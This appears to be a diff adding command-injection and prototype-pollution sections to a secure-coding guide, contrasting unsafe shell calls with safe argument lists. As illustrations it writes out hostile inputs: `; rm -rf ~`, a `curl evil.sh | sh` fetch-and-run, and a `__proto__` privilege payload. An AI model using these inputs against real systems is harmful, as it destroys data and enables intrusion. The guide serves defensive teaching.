@@ -77,3 +77,25 @@ await db.users.update({ where: { id }, data: req.body });
 const { name, email } = validated.data;
 await db.users.update({ where: { id }, data: { name, email } });
 ```
+
+## Command Injection
+
+Never build a shell command from user input. Passing a string to a shell lets `; rm -rf ~` or `$(curl evil.sh | sh)` run on your server:
+
+```typescript
+// BAD: the filename is interpreted by a shell
+exec(`convert ${req.body.file} out.png`);
+
+// GOOD: no shell; arguments are passed as a list
+execFile('convert', [file, 'out.png']);
+```
+
+Input starting with `-` can still be read as an option, so validate it (e.g. allow only generated filenames), and put `--` before it for commands that support that, such as `git`. Python: `subprocess.run(['convert', file, 'out.png'])`, never `shell=True` or `os.system` with user input. Never pass user input to `eval`, `new Function`, `vm`, Python's `eval`/`exec`, `pickle.loads` or `yaml.load` (use `yaml.safe_load`).
+
+## Prototype Pollution (JavaScript)
+
+Deep-merging untrusted JSON into an object lets an attacker send `{"__proto__": {"isAdmin": true}}` and give *every* object an `isAdmin` property:
+
+- Don't deep-merge request bodies into config, defaults or user objects. Validate with a schema first (Zod's `z.object` drops unknown keys by default).
+- Reject the keys `__proto__`, `constructor` and `prototype` in any code that copies user-supplied keys.
+- Use `Map` or `Object.create(null)` for lookups keyed by user input.
